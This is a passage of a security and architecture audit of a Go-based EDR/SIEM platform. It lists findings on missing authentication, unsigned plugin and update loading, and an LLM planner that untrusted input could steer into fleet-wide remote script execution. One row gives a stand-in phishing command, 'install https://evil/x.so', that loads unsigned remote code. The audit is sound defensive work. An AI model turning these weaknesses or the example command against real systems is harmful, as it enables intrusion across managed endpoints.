| AI-13 | High | `dev/internal/edr_agent/response/executor.go:50-72` chain | `Params[\"chain\"].([]any)` reuses the same Params per link via `executeSingle` | One dispatch amplifies to isolate + forensics + ... with no per-link authz | AuthZ, Policy |
| AI-14 | High | `dev/internal/edr_agent/agent.go:947-1010 pollAndExecute` | `PollActions` then `go executeAction` unconditionally, including `isolate_host` | Endpoint is a pure deputy of the server queue; server compromise equals fleet compromise | Policy, Verification |
| AI-15 | High | `dev/internal/server/sync.go:handleEDRDispatch` + `permissions.go` | `INSERT edr_actions(action_type,target,params,pending)` with no allowlist/schema/size/approval/audit | Arbitrary `run_script` queued; no HITL for `isolate_host` | AuthZ, Policy, Audit |
| AI-16 | High | `dev/internal/server/sync.go:RegisterRoutes` + `handleEDRRegister` | Unauthenticated enroll, attacker hostname, minted key (see SEC-02) | Rogue agent identity; data poisoning | AuthN, Identity |
| AI-17 | High | `dev/internal/server/sync.go:pending/result/events` handlers | Trust `?agent_id` / body `agent_id` / bare `action_id` (see SEC-04) | Horizontal escalation; action theft; state forgery | AuthN, AuthZ |
| AI-18 | High | `dev/internal/server/sync.go:1155-1275` update/download/feed/config | `update/download` prefix-only; `vuln/feed` unauth; `config PUT` lets any agent set fleet-wide monitors | Malicious binary; feed poison; fleet monitor-disable / DoS | AuthN, AuthZ, Verification |
| AI-19 | High | `dev/internal/playbook/executor.go:70-208`, `investigation.go:123-129`, `cmd/trace/approval.go`, builtins (no `wait:`) | Destructive playbooks lack `wait: analyst_approval`; `waitForApproval` polls global status approved/denied every 500ms forever — no step nonce, identity, or expiry; `Approve` is blind `UpdateStatus`; CLI has no auth | Any approval unblocks any step (TOCTOU); default zero HITL | AuthZ, Policy, Verification |
| AI-20 | High | `dev/internal/playbook/executor.go:116-168`, `host.go:401,451,508,527`, `response.go:284-295` | `step_started` logs full params (keys/tokens/webhooks/scripts); outputs + LLM intent/errors + shell commands logged | Secrets/PII/shell into 0644 JSONL, dashboard timeline, LLM provider logs | Audit (redaction + 0600) |
| AI-21 | Medium | `dev/internal/config/config.go:155-182`, `agent_config.go:60-71`, `investigation.go:172-200` | Full Config + remote defaults + logs at 0644/0755; key printed at boot | Local disclosure feeds AI-20 exfiltration | Execution, Audit |
| AI-22 | High | `dev/internal/integration/notifier/notifier.go:384-410`, `splunk.go:20-28`, `elastic.go:18-27` | Webhook arbitrary URL; Splunk `search %s` concat; Elastic `query_string`; both `InsecureSkipVerify`; creds from LLM params per call | SSRF/exfil; SPL/ES injection; MITM; credential exfiltration | ToolAccess, Policy, Execution |
| AI-23 | Critical | `dev/internal/integration/edr/agent.go:115-129 run_script` + `edr-*.yaml` | Non-empty check only; unbounded script; playbooks carry no `wait:` | Planner reaches remote script execution through the normal flow; combined with AI-01/AI-02 this is prompt-to-fleet-RCE | Policy, ToolAccess |
| AI-24 | Medium | `dev/internal/sift/detection.go` yaraScan/peAnalyze | `input[path]` to `ScanFile`/`AnalyzePE` with no confinement (`../`, absolute, devices) | Arbitrary read into report/correlations; pivot into quarantine | ToolAccess, Policy |
| AI-25 | High | `dev/cmd/trace/plugin_cmd.go` + `root.go:initRegistry` | `install http.Get` (index.json/`.so`) no signature; exec `.so` auto-loaded next serve; crowdstrike empty-creds; builtins unconditional | Unsigned remote code gains the full toolset; phishing `install https://evil/x.so` | Verification, Audit |

Per-agent chain gaps: dispatch AuthN/Policy/Verification; response AuthZ/Policy/ToolAccess/Execution/Verification; endpoint Policy/Verification; EDR-integration Policy/ToolAccess; sift/archive/OTX/AbuseIPDB Verification/Policy; splunk/elastic Policy/Execution; notifier Policy/ToolAccess; sidecar/`.so` Identity/AuthN/Policy/Audit; server EDR Identity/AuthN/AuthZ/Policy/Audit; executor AuthZ/Policy/Verification.

Fix order: argv exec + allowlists (IP/PID/service/path); remove or gate `run_script` + chain; agent identity + plugin manifest deny-by-default; auth on register/download/feed + ctx-bound IDs + action allowlist + admin-only config PUT + audit writes; schema-validate LLM JSON + taint-isolate untrusted outputs + redact logs; per-step approval tokens + `wait:` on destructives; 0600/0700 secrets; TLS verify + URL allowlists. Unable to determine from codebase: production TLS/mTLS posture beyond defaults and any external admission proxies.
# Testing Findings

| Area | Evidence | Gap | Severity |
| ---- | -------- | --- | -------- |
| CLI behavior | `dev/cmd/trace/main_test.go:50-56,123-124` no-op bodies (`_ = t`, empty); only help/unknown-flag/completion/golden | No behavior, validation, destructive-confirm, or error-contract tests; CLI is the largest surface yet untested | High |
| AuthZ matrix | `dev/internal/server/server_test.go:127-158` only 401-no-auth + 200-bearer/query-param; `permissions_test.go:1-90` map-only | No 403 role test, invalid-key, scope, agent-key, or dashboard-auth test; scope is dead code yet unit-tested (false confidence) | Critical |
| EDR IDOR/spoof | `dev/internal/server/sync.go:554-560` pending, `:376-433` heartbeat, `:649-672` result | No test with agent-A token + `?agent_id`=B / body B / foreign action ID | Critical |
| Destructive executor | `dev/internal/edr_agent/response/executor_test.go:1-130` happy-path only (missing pid/path/ip, unknown, snapshot) | No `run_script` injection review, `block_ip`/`isolate_host` command-construction, chain-abort, rollback-content, or timeout-kill tests | High |
| Detection engine | `dev/internal/siem/rules.go:783-800`, one happy correlation test, skipped in `-short` | No threshold-boundary (threshold-1 = no alert), window-slide/expiry, suppression-bypass, evil-regex ReDoS, malformed-YAML fuzz tests | High |
| Sift failure contract | `dev/internal/sift/detection.go:61-123` returns `Output{error:...}, nil` on scan failure | Error-as-data: callers cannot distinguish failure from success; no failure-path test asserts `err != nil` | Medium |
| Integrations | `abuseipdb_test.go:37-40`, `otx_test.go:47-50` only `NoAPIKey` | No 429/500/truncated-JSON/timeout/cache-behavior tests | Medium |
| Cases | `dev/internal/cases/manager_test.go:28-370` happy + severity default + IOC normalize | No invalid-status/severity, `GetByPrefix` miss, SQL-wildcard, or concurrent-create tests | Medium |
| Playbook approval | `dev/internal/playbook/executor.go:220-221` + `interpolate.go:101-102` stubs | `waitForApproval` polling loop + permanently-broken `PendingApprovals`/`investigation refs` untested | Medium |
| LLM planner | `dev/internal/dispatch/host.go:418-452` fallback chain, no HTTP-mock test | No retry, empty-content, bad-JSON, or provider-fallback tests | Medium |
| Hard-to-test architecture | `monitor/etw_windows.go:112-114` global Once+callback; `fanotify_linux.go` needs `CAP_SYS_ADMIN`; `agent.go:174-216` triple fallback chain | Platform-gated + privilege-gated + global state: tests exercise polling path only; coverage illusion on Windows/Linux-privileged paths | Medium |

Architectural testability note: god files (`sync.go`, `host.go`, `agent.go`, `rules.go`) and singletons (`var app`, `metrics.Global`, `StoragePathFunc`, ephemeral audit key) force integration-style tests where unit tests should exist. Boundaries from the target architecture (gateway, policy-gated executor, argv helpers, registries) are prerequisites for fast, hermetic tests.
# Observability Findings

Operator questions — what happened / why this alert / why this action / which component failed / what data caused it / before-and-after — are today answerable only partially, and for destructive or AI-driven actions, effectively not at all.

| Evidence | Gap | Severity |
| -------- | --- | -------- |
| `dev/internal/server/sync.go:71-75` scope in ctx; zero readers outside test | No enforcement, no scope/role/user logging on deny — cannot answer which-key or why-denied | High |
| `dev/cmd/trace/root.go:465-471` logger created; zero `Write` callsites repo-wide | Destructive ops (dispatch/dismiss/revoke/admin/user/case) produce no audit entry; `Verify` tests a log never written | Critical |
| `dev/internal/playbook/executor.go:39-168` 10 event types, every `WriteEvent` return ignored; no `request-id|X-Request-ID|trace_id|otel|CorrelationID` in `internal/`, `cmd/` | No correlation ID across hunt to investigation to agent to tool; `WriteEvent` failure (disk full) silent; before/after lost on failure | High |
| `dev/internal/storage/metrics/metrics.go:1-110` 16 TSE counters emitted as gauges (even `_total`); no HTTP/auth/agent/SIEM/action series | Blind to API abuse, heartbeat lag, alert rate, action outcomes, queue wait | High |
| `dev/internal/server/sync.go:888-903` `/health`, `/healthz`, `/readyz` always `ok`; `/metrics` + dashboard unauthenticated | Liveness lies (DB down still `ok`); metrics leak internals; dashboard bypasses RBAC | High |
| `log.Printf` in 108+ files (e.g. `dispatch/host.go:111,401,416,433,451,508,527,532`; `siem.go:110,296,302`; `agent.go:156-265`); `api_key` adjacent in meta marshal (`agent.go:461-464`) | Ad-hoc prefixes, no level/JSON; log injection via hostname/intent; key material near logs | Medium |
| `dev/internal/telemetry/telemetry.go:1-70` POST every 24h; `resp.Body.Close()` without status check; dead `init(){_=fmt.Sprintf}` | Opt-in/default undocumented in code; silent failure; privacy surface unclear | Medium |
| `dev/internal/server/sync.go:534-552` `go writeEventsToTSE(context.Background(), ...)` detached | Loses request trace and cancel; TSE errors only `log.Printf`; stored-vs-received divergence untracked | Medium |
| `dev/internal/investigation/investigation.go:172-180` JSONL append, no fsync/rotation; `sync.go:322-335` timeline 404 vs 500 conflates `logDir==\"\"` vs read error | Timeline gaps misdiagnosed; crash window undocumented | Low |
# Data Architecture Findings

| # | Severity | Location (function) | Observed then problem | Recommendation |
| - | -------- | ------------------- | --------------------- | -------------- |
| D1 | High | `dev/internal/storage/sqlite/hot_store.go:258 ensureTable` | Only `idx_ts(ts_us)`; no tenant/agent/type/severity index, so every hot query scans each hourly table | Add `(tenant_id, ts_us)` + `(event_type, ts_us)` composites after write-bench |
| D2 | High | `dev/internal/storage/sqlite/hot_store.go:348 buildHotQuery` | `UNION ALL` over all `liveTables` with no hour-suffix pruning | Prune tables by hour vs `Since/Until` before building SQL |
| D3 | High | `hot_store.go:355` + `dev/internal/storage/cold/parquet_reader.go:205 QueryFiles` | No `TenantID` predicate in hot SQL or cold row filter; cold isolation only via manifest routing | Add `tenant_id=?` hot; row-level `TenantID` check cold |
| D4 | High | `dev/internal/storage/types.go:33 Event` vs `hot_store.go:145`, `parquet/schema.go:6`, `writer.go:177`, `server/sync.go:545` | `Annotations` has no hot column or parquet field; dropped in `eventToParquet` and server TSE mapping | Persist annotations (column or folded `DataRaw` envelope) with migration + round-trip test |
| D5 | Medium | `dev/internal/storage/sqlite/hot_store.go:112 WriteBatch` | Table from `events[0].Timestamp` only | Split batches by hour (see A5) |
| D6 | High | `dev/internal/server/sync.go:492 handleEDREvents`, `:545 writeEventsToTSE` | Only `evt.ID != \"\"` check; client IDs break UUIDv7 `MinID/ORDER BY` watermark; no severity/tenant/time bounds | Validate-or-mint UUIDv7; clamp severity/time; pin `TenantID` from ctx |
| D7 | Medium | `dev/internal/storage/manifest/manifest.go:62 migrate` | Bare triple `CREATE IF NOT EXISTS`, no version log | `schema_migrations` table; ordered migrations |
| D8 | High | `dev/internal/storage/sqlite/hot_store.go:318 DropTable` + `manifest.go:217` | Drop primitives test-only; flusher never drops; `HotWindow` unwired | Retention job: drop only behind watermark + window; metric + test |
| D9 | High | `dev/internal/storage/gc/ttl.go:48 applyOnce` | `FilesFor(min<=cutoff)` then marks ALL returned files expired without `MaxTS` check; double owner with `GC.collectOnce` | Expire only if `MaxTS < cutoff`; single owner; test half-open file survives |
| D10 | Critical | `dev/internal/storage/compactor/compactor.go:158 compactGroup` | Calls non-Tx `AddFile/UpdateFileStatus` inside `Transaction` | Use `AddFileTx/UpdateFileStatusTx` with the tx; crash test compact path |
| D11 | High | `dev/internal/storage/compactor/compactor.go:62 Run`, `:179 CleanupSuperseded` | `Run` only `compactOnce`; `CleanupSuperseded` never scheduled | Call on tick + metric for superseded age/count |
| D12 | Medium | `dev/internal/storage/router/router.go:40 Query` | Watermark + `FilesFor` re-read every query, no cache | TTL cache invalidated on flush/compact |
| D13 | Low | `dev/internal/server/pb.go:116`, `taskqueue.go:100 Complete/Fail` | `edr_events.data` raw + columns with no TTL; tasks linger `done/failed` forever | Batched TTL purges; archive-then-delete |

Normalization judgment: columnar hot fields + `DataRaw` residual is justified denormalization (10-20x compression source; predicate pushdown) — except `Annotations` dropped (D4). Manifest + watermark + hot_tables registry is correctly normalized. `server_*` multi-node tables vs local ops tables need an org/tenant backfill pass (SEC-08). Caching belongs at watermark/`FilesFor` (D12) and hot-query path, not inside the flusher. Event-driven processing would help SIEM fan-out and TSE ingest (bounded workers + DLQ) but must not precede the durability fixes (R1-R3).
# API Findings

| Evidence | Gap | Severity |
| -------- | --- | -------- |
| `dev/internal/server/sync.go:143,154,156` open register/download/feed; `:75` scope dead; `:151` DELETE needs read; `:157` compliance bare `protected` | AuthZ matrix incoherent (see SEC-01-08) | Critical |
| No `RateLimit/throttle/429` on server mux (only client backoff `transport/client.go:214-217`, `abuseipdb.go:86`, `edr.go:252`) | Brute-force `api_key`, unbounded `body.Events`, heartbeat storm unthrottled | High |
| Lists: nodes (no limit), investigations (fixed 100, ignores `?limit`), correlations `LIMIT 100`, agents (no limit), orgs/users (no limit); only EDR events clamps (50/500) | Truncation for large fleets / OOM; `router/pagination.go:14-34` (default 1000/max 10000) exists but unused by HTTP | Medium |
| Versioning `/api/v1/*` only; dashboard JS hardcodes `/api/v1/timeline/` (`dashboard.go:453`); `writeJSON` always `application/json` no charset; error `{\"error\"}` vs `{\"status\"}` vs raw arrays | Breaking-change risk; brittle CLI `Decode` | Medium |
| Idempotency none: `handleEDRDispatch` new UUID per POST (`sync.go:850-870`); `handleRegister` new node per POST; duplicate events `continue` silently | Retries double-dispatch kill/isolate; duplicates invisible | High |
| Timeouts good server-side (`sync.go:922-926` Read 30s/Write 60s/Idle 120s) but CLI `http.Client{15s}` vs 5/10/30s across commands; TSE fan-out detached | Inconsistent deadlines; lost cancel | Low |
| Validation thin: hostname/agent_id/action/email/role non-empty only; `action_type` free string reaching `run_script`/`isolate_host`; `search` unbounded `LIKE %..%`; `AlertID[:8]` (`sync.go:611`) panics on short ID | Injection/crash/destructive dispatch | High |
| Error contract split: `writeError{\"error\"}` vs `{\"status\"}` vs plain `ok` vs 204 vs 303 | Clients guess shapes; `edge/postJSON` maps only `error` | Medium |
| TLS optional (`CertFile/KeyFile` empty means plaintext); `SeedDefaultUser` prints key (`server.go:28-35`); `api_key` via query param | Plaintext creds; log/shell-history disclosure | High |

# Deployment and Infrastructure Findings

| Evidence | Gap | Severity |
| -------- | --- | -------- |
| `dev/Dockerfile` whole (`CGO_ENABLED=0`, no `HEALTHCHECK`, `USER trace`, `EXPOSE 8080`); no `.dockerignore` | `COPY . .` bakes `trace.exe`, `.trace/logs`, `config.json` into GHCR; `CGO=0` silently disables DuckDB fast reader the deployment guide advertises | High |
| `dev/docker-compose.yml:5,23` `minio/minio:latest` + `minio/mc:latest`; `:14,:29` `tracetrace` x2; `curl`-less minio healthcheck; agent `privileged+pid:host+SYS_ADMIN/PTRACE`, `/var/log:ro`, `/etc:/host/etc:ro`; `TRACE_DB_PATH /root/.trace` vs image `/home/trace/.trace`; S3 `minio:9000` plaintext; 8080/8081 plain HTTP | Unpinned images; committed creds; never-healthy dependency; over-privileged agent; path mismatch; plaintext by default | Critical |
| `dev/deploy/Dockerfile.agent` whole (root, iptables, baked `agent.yaml`) | `server_url https://trace-server:8080` vs installers `:8443` — fresh installs point at the wrong port | High |
| `dev/deploy/daemonset.yaml:30,82,97` `CHANGE_ME`, `trace-agent:latest+IfNotPresent`, privileged + `SYS_ADMIN/PTRACE/NET_ADMIN/SYSLOG/NET_RAW` + hostPID/hostNetwork + hostPath `/proc` + `/var/lib/docker`, `TRACE_AGENT_SERVER https://trace-server:8080` plaintext | Committed secret; drifting image; maximum blast radius | Critical |
| `dev/deploy/install.sh:39-44`, `install.ps1:27-32` `DOWNLOAD_URL $SERVER/api/v1/edr/update/download?...` via `curl\|bash` / `Invoke-WebRequest`, no auth/checksum/signature, `chmod 755`, key appended world-readable | Unauth download is installable over the network as root (server `sync.go:154` has no auth) | Critical |
| `dev/internal/config/config.go:130-144` Syslog `:514` unbindable as `USER trace`; 0644; env covers only DB/VT/LLM/ABUSE/OTX | Port/secrets/env gap between image user and defaults | Medium |
| `dev/internal/server/sync.go:876-940 ServeHTTP` TLS opt-in else plaintext; `/healthz/readyz/metrics` unauth; `readyz` never checks DB/TSE | Plaintext control plane; false-green ready; internal leak | High |
| `dev/docs/deployment-guide.md` systemd lacks `WorkingDir/EnvFile/LimitNOFILE`; `docker run` repeats `/root` path bug; backup only manual snapshot/`cp`; upgrade `cp`+restart with no migrate/health gate | Prod guidance does not match reality | Medium |
| `dev/internal/storage/leader.go:41-133` heartbeat 5s/timeout 15s; `Download` error triggers `promote()` | No fencing/term — dual leaders and dual flushers (see R11) | High |
| `dev/cmd/trace/tse_init.go:166-171` disk warn/full only logged (docs claim reject at 95% — not found in code) + `synchronous=OFF` | Disk-full and crash-corruption posture is log-only | High |
| `dev/internal/storage/backup/scheduler.go:105-145` whole snapshot `ReadFile` into RAM; `rotateLocal` deletes lexically-first of ALL files | OOM on large snapshots; may delete non-snapshot files | High |

# Supply-Chain Findings

| Evidence | Gap | Severity |
| -------- | --- | -------- |
| `dev/go.mod` go1.26.4 + bases `golang:1.26-alpine`/`alpine:3.21`/`minio:latest` unpinned; CI `check-latest:true`; no `go mod verify` in image | Non-hermetic, drifting builds | High |
| `dev/.github/workflows/ci.yml` no `permissions:` (broad token); checkout/setup-go/metadata/login/build-push major tags no SHA; `Vet\|\|true`; fuzz 10s no corpus; no provenance/SBOM | Swallowed vet; unsigned attestations; weak fuzz signal | Medium |
| `dev/.github/workflows/release.yml` `contents:write`; `make cross` drops LDFLAGS (`Version` lost); sha256 unsigned; GPG optional; `gh-release@v2` unpinned | Unverifiable artifacts; version skew | High |
| `dev/internal/plugin/plugin.go:42-71` `plugin.Open(*.so)` from `DBDir/plugins`, silent overwrite, fail-fast on first bad `.so`; `plugin-development` install `<url>` no checksum; `grpc-plugin.md` `insecure.NewCredentials` example; `buildmode=plugin` Linux-only vs Windows EDR target | Unsigned code-load; example normalizes insecure transport | Critical |
| `dev/internal/edr_agent/updater/updater.go:82-103` empty-SHA skips; any `download_url`; 0755 no fsync | Fail-open update (see SEC-10) | Critical |
| Secrets: config 0644, printed keys, `tracetrace`/`CHANGE_ME`, `SeedDefaultUser` `uuid[:24]` + empty `password_hash` | Committed and world-readable credential material | High |
| `dev/internal/storage/s3.go:32-60` HTTP unless `UseSSL` + BasicAuth, naive `List <Key>` split, no SigV4 | MinIO-only yet defaults codify plaintext | High |
| `dev/internal/integration/elastic/elastic.go:25`, `splunk.go:26` `InsecureSkipVerify:true` | URL/API-key/BasicAuth exposed to MITM | High |
| `dev/internal/audit/logger.go:38-56` `New(nil)` random key + MAC excludes details + zero writes | Unverifiable, mutable, unwritten audit (see SEC-17) | High |
| `dev/tools/wazuh-converter/main.go` absolute `C:/Users/YMA` + `D:/Projects` paths | Unreproducible `*_gen.go`; generated file checked in without lock | Medium |

Dependency CVE risk: undeterminable from the codebase alone — versions are pinned (e.g. `golang.org/x/sys v0.46.0`, `grpc v1.82.1`, `sqlite v1.54.0`) but no advisory database was consulted per audit rules. `go.sum` exists; no `npm`/`pip` surfaces.
# Extensibility Findings

How much existing code changes to add one more of each (open-for-extension / closed-for-modification judgment; patterns recommended only where justified).

| Extension point | Effort to add one more | What breaks / must be edited | Judgment |
| --------------- | ---------------------- | ---------------------------- | -------- |
| SIEM decoder (`Decoder` iface `decoder.go:14`) | Low-Medium | BOTH `siem.go:88` fixed list AND `decoder.go:260 AutoDecoder` order; order-sensitive `K8s>JSON>Apache>Syslog>Win`; fallback raw hides miswire; `benchmarks_test.go:101` hardcoded | Half-open: add `RegisterDecoder(name, priority, fn)` + load-once + order test |
| Sigma / Elastic / Splunk / Wazuh rule format | High | `matchesCondition` only `tag:/field:/severity>=`; `evaluateFieldExpr` `==/!=/~/>/< /in` (prefix, not CIDR); correlationKey 2 IDs else global bucket; `mapCompliance` ~30-ID switch + severity fallback; global per-RuleID suppress | Closed: needs rule-IR + `siem/rules/*.yaml` + per-(rule,entity) suppress before new formats are safe |
| EDR vendor (`EDRProvider` `edr.go:42-49`) | Medium per vendor | 6+ switch sites (auth x2, doRequest, Get, Isolate, Release, Kill, Scan, RunScript) + vendor paths + `login.microsoftonline`; `Config` lacks cert/OAuth-code; shared rate/circuit; `root.go:389` hardcodes crowdstrike | Half-open: per-vendor strategy + factory + config-carried auth |
| Threat-intel provider (no unified iface; `otx.go:16`, `abuseipdb.go:15`, `vt.go:24` per-Client + per-Agent) | Medium each | New Client + Agent + Execute case + registry + config + env + playbook; no fan-out/memoize interface | Closed: add `IntelSource` (`Fetch/Normalize/Cache`) + fan-out + TTL memoize |
| LLM provider (`host.go:176-194,460-486`) | Low | `AddProvider` is open but default schema is OpenAI-shaped; `WithModel` primary-only; no budget; manual `promptVersion` | Mostly open: add per-provider schema + budget caps + auto version |
| Database backend (`db.go:15-67` translate) | High | String surgery corrupts literals; `BeginTx` raw; `AUTOINCREMENT` DDL; error-ignored ALTERs; unit-tested only | Closed: quote-aware lexer or per-driver migrations + PG integration test |
| Notifier channel (`notifier.go:16-83`) | Low-Medium | Agent + AgentConfig + Config + `NewWithConfig` + Capabilities + `sendX` + `HasAnyNotifier`; provider URL echo | Half-open: self-registering `map[string]Factory` |
| On-agent response action (`executor.go:92-110`) | Low-Medium | `snapshotBefore` block_ip-only; chain reuses Params; 30s no kill-tree; no server approval on this path | Half-open after argv + policy fixes (AI-12/13) |
| Third-party EDR action (new iface method) | High | Adding a method breaks all vendors + `edr/agent.go:52-125` + `handleEDRDispatch`; no capability negotiation | Closed: capability query + versioned iface, never widen core iface lightly |
| Compiled-in agent (`agent.go` + `plugin.go:14-28`) | Low | Truly open via `Register`, but silent overwrite, nil-`Get` runtime error, no param schema; `.so` Windows-broken; gRPC sidecar docs-only | Open the registry properly: manifest (name/version/caps/schema) deny-by-default + signed loads |

# Feature Gap Analysis

Only gaps that logically follow from the existing system (no wishlist).

| Area | Observed | Missing capability | Severity |
| ---- | -------- | ------------------ | -------- |
| Alert lifecycle | `Alert{ID..CreatedAt}` no status/owner (`siem.go:25-33`); dedup Title\|RuleID 5m; suppress global; `serve.go:143-147` sev>=4 creates one case per alert; 3 conflicting severity scales (rules 0-5 vs dashboard Critical>=7/High 4-6 vs autocase>=4) | Ack/assign/SLA/dedup-by-(rule,entity)/escalation; single severity scale + mapping test | High |
| Case management | `UpdateStatus` any string; reopen never clears `closed_at`; List `LIMIT 100`; `db.go` no `org_id`; no `/api/v1/cases` (dashboard form only) | State machine (open->investigating->resolved->closed + reopen), paginated scoped API, org predicates | High |
| Correlation | `server_correlations` ioc/count only; `correlationKey` 2 IDs else global; agent correlator local-only | Entity graph (host/user/process/ip) + cross-rule joins + confidence decay | High |
| Timeline / evidence | `GetEvents` `created_at` only; `ExportHTML` omits `case_evidence`; no hash/custody; JSONL 0644 + skip-corrupt; `/api/v1/timeline` investigation-only | Hash-chained evidence with custody, full timeline API, fsync/rotation policy | Medium |
| Playbook / approval | `executor.go:70-99` polls 500ms forever; no TTL/escalation/identity; `PendingApprovals` stub error; invisible API; no approver ping | Bounded approvals (TTL + escalation + identity + step nonce) + visible queue + notify | High |
| Audit / compliance | Zero audit writes; no `/api/v1/audit`; static PCI/HIPAA/NIST labels from `mapCompliance` | Real audit trail + query API; evidence-backed compliance (labels only after assessment linkage) | High |
| Reporting | Single-case HTML/PDF only; no schedule/CSV/CEF; `ColdTTL` unverified | Scheduled + multi-case + machine-readable exports | Medium |
| Multitenancy | TSE has `TenantID` (flusher groups, compactor) but app tables org-blind; `OR org_id=''` fail-open; register trusts `OrgID`; scope unenforced; `readOnly=PermCaseRead` gates everything | End-to-end tenant isolation (auth ctx to storage predicate) | Critical |
| Asset / risk | No `Asset` type / `risk_score`; `frameworks.go:126` inventory is text; vulns without asset join | Asset inventory + vuln join + risk scoring feeding triage | High |

# Code Quality Findings (highest-signal items)

| Evidence | Problem | Severity |
| -------- | ------- | -------- |
| `dev/internal/server/pb.go:466-497` triple `Authenticate*/AuthenticateOrg*/Full` differing by 1-2 columns | Duplication; callers pick stale variant (scope forgotten) | Medium |
| `dev/internal/server/sync.go` 1305L; `dashboard.go` 859L; `siem/rules.go` 941L; route+handler+SQL+HTML/CSS/JS in one file; dashboard embeds CDN Chart.js | Unreviewable; CDN dependency; style drift | Medium |
| `dev/internal/cases/manager.go:159-224` `rows.Scan` error to `continue`; `dev/internal/compliance/report.go:154-183,386-405` open/read/unmarshal errors swallowed; `host.go:496` `respBody, _`; `edge/client.go:141` decode ignored; `admin.go:218,224` `req, _` | Data loss presented as success; compliance score untrusted; truncated LLM body parsed as complete | High |
| `dev/internal/server/pb.go:280-306` confidence 0.5/0.75/0.9; `sync.go:621-622` dismiss>=10; `server.go:87` stale 90s; `sync.go:559,672,1091` LIMIT 10/100 | Magic thresholds with no names or source comments | Low-Medium |
| `metrics.Global`, `locale` init side-effect, `frameworks` init registration, ~15 `var _ =` / `init(){_=...}` pacifiers | Test pollution; import side-effects; noise hiding real unused deps | Low |
| `dev/cmd/trace/admin.go:32` org-create `Sprintf` JSON; `dev/cmd/trace/edr_cmd.go:179-181` raw query concat; `dev/internal/server/pb.go:345-357` `LIMIT %d` Sprintf | Injection-adjacent string building (today int/code-limited, tomorrow exploitable) | Medium-High |

# Architectural Red Flags (future disasters, explicit)

1. Same-port unauthenticated control plane (`dashboard.go:39` + `sync.go:143/154/888`) — CRITICAL: every other control assumes a network boundary that does not exist.
2. Fleet RCE termination (`executor.go` `sh -c` + privileged DaemonSet + `PermAgentWrite` dispatch + chain) — CRITICAL: one credential equals every endpoint.
3. Unsigned bundle (`.so` + `curl|bash` + unauth download + optional checksum + `latest`) — CRITICAL: three independent remote-code paths with no signature.
4. Tenant leak (`OR ''` + client `OrgID` + missing predicates) — CRITICAL: multi-user mode discloses on day one.
5. S3 split-brain (`leader.go` unconditional promote) — CRITICAL: dual flushers corrupt the manifest truth both depend on.
6. Silent-drop evidence pipeline (10k/1k channels + evict-100 + lossy spill + `OFF` + never-draining agent queue) — HIGH: the system loses the attack that overloads it.
7. Case explosion + global suppress (`serve.go:143` + `rules.go:772`) — HIGH: alert storms create case spam while cross-host suppress hides lateral movement.
8. Dead audit + ephemeral key — HIGH: destructive actions are unlogged and prior signatures unverifiable after restart.
9. Naive PG `translate()` — HIGH: the entire stateless-server / horizontal-read plan rests on a string surgery that corrupts literals.
10. RAM-buffered backup + lexical rotation; disk-log-only + `sync OFF` — HIGH: backups OOM and may delete wrong files; disks fill while the code logs.
11. AWS-incompatible plaintext S3 + `tracetrace` defaults — HIGH: HA story works only against MinIO on trusted networks.
12. Skew between docs and code (converter absolute paths, LDFLAGS version drop, `:514` unbindable as image user, `OR org_id=''` vs documented RBAC) — MEDIUM: deploys built from docs fail or open holes.
# Technical Debt

Separated into intentional choices (keep) vs real debt (pay down). Exact locations given so a future maintainer can grep and close each item.

## Intentional choices — NOT debt

| Choice | Why it is correct | Evidence |
| ------ | ----------------- | -------- |
| Single binary, SQLite-first hot tier | Zero-dependency edge deploy; backup by file copy; correct for small SOC | `dev/Dockerfile`, `dev/docs/edge-deployment.md`, `hot_store.go` |
| Pure-Go default with DuckDB opt-in | CGO-free portability; 5-10x analytics available via `-tags duckdb` | `dev/internal/storage/cold/reader.go`, `duckdb.go` + stub |
| Vendored generated snapshots (`wazuh_*_gen.go`, `mitre_seed_gen.go`) | Deterministic offline intel; reproducible builds | `dev/internal/siem/wazuh_*_gen.go:3-4` |
| Playbook YAML shape (`agent/action/params/timeout/if/wait/optional`) | Human-editable, version-controllable, offline-runnable | `dev/playbooks/*.yaml`, `playbook.go` |
| Columnar hot fields + `DataRaw` residual | 10-20x compression + predicate pushdown; LSM-from-boring-parts | `types.go:33`, `parquet/schema.go` |
| Protocol/ABI/enum constants (Section A table) | Wire and OS contracts must not be configurable | See Hardcoding A |

## Real debt — pay down in roadmap order

| ID | Location | Debt | Why it hurts | Payoff |
| -- | -------- | ---- | ------------ | ------ |
| TD-01 | `dev/internal/playbook/executor.go:220-221`, `interpolate.go:101-102` | Permanent-error stubs for advertised `PendingApprovals` / `investigation refs` | `approval list` CLI and `${investigation.*}` permanently broken; users script against errors | Implement DB-backed approvals or delete type + CLI (P1) |
| TD-02 | `dev/internal/storage/parquet/schema.go:40-43` | Deprecated `ToParquetCompression` passthrough | Two canonical compression paths; confusion on write path | Clean cutover + delete shim (P2) |
| TD-03 | `dev/internal/siem/integration_test.go:297-298` | `_ = os.Getenv; _ = context.TODO` scaffold | Noise; hides real setup gaps | Delete (P2) |
| TD-04 | 19 dead `init` / `var _` pacifiers: `archive/knowledge.go:213-214`, `cases/manager.go:505-507`, `compliance/report.go:569-570`, `hunt/manager.go:282-284`, `hunt/scheduler.go:136-138`, `playbook/integration_test.go:228-229`, `plugin/plugin.go:77-79`, `server/dashboard.go:856-858`, `server/sync.go:init`, `pb.go:init`, `telemetry.go:init`, `edr_agent/monitor/priorityq.go:137-138`, `plugins/sca/sca.go:440-441`, `service_unix.go:72`, `service_windows.go:131`, `usb_windows.go:172`, `killchain.go:184`, `amsi_windows.go:136` | Import pacifiers with zero behavior | Hides real unused deps; slows review | Delete all; fix imports (P2) |
| TD-05 | `dev/internal/compliance/report.go:154-168,176-183,386-405`; `dev/internal/cases/manager.go:159-224`; `dev/internal/dispatch/host.go:496`; `dev/internal/edge/client.go:141`; `dev/cmd/trace/admin.go:218,224` | Silent-error handling: open/read/unmarshal ignored, corrupt rows skipped, `respBody, _`, `req, _` | History silently empty; compliance score untrusted; truncated LLM body parsed as complete | Propagate errors; surface corrupt counts; test bad-JSON (P1) |
| TD-06 | `dev/internal/server/pb.go:280-306`, `sync.go:621-622,559,672,1091`, `server.go:87`, `router/pagination.go:14-34` | Magic ladder 0.5/0.75/0.9, dismiss>=10, stale 90s, LIMIT 10/100, page caps 1000/10000 unused by HTTP | Tuning without context; threshold change risky; pagination exists but unwired | Named consts + comments + wire pagination (P1-P2) |
